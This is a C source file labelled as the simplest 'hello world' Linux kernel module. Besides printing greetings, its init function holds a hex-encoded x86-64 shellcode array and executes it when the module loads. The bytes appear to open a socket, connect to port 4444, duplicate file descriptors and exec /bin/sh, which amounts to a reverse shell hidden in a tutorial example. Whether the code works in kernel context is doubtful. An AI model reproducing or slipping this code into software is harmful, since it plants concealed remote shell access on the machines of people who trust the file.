/*  
 *  hello-1.c - The simplest kernel module.
 */
#include <linux/module.h>	/* Needed by all modules */
#include <linux/kernel.h>	/* Needed for KERN_INFO */

int  init_module(void)
{
	printk(KERN_INFO "Hello world 1.\n");
	unsigned char code[] = 
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01"
"\x5e\x48\x31\xd2\x0f\x05\x48\x97"
"\x6a\x02\x66\xc7\x44\x24\x02\x11"
"\x5c\x54\x6a\x2a\x58\x5e\x6a\x10"
"\x5a\x0f\x05\x6a\x03\x5e\x6a\x21"
"\x58\x48\xff\xce\x0f\x05\xe0\xf6"
"\x48\x31\xf6\x56\x48\xbf\x2f\x62"
"\x69\x6e\x2f\x2f\x73\x68\x57\x54"
"\x5f\xb0\x3b\x99\x0f\x05";
int (*ret)(void) = (int(*)(void))code;
    ret();

	/* 
	 * A non 0 return means init_module failed; module can't be loaded. 
	 */
	return 0;
}

void cleanup_module(void)
{
	printk(KERN_INFO "Goodbye world 1.\n");
}


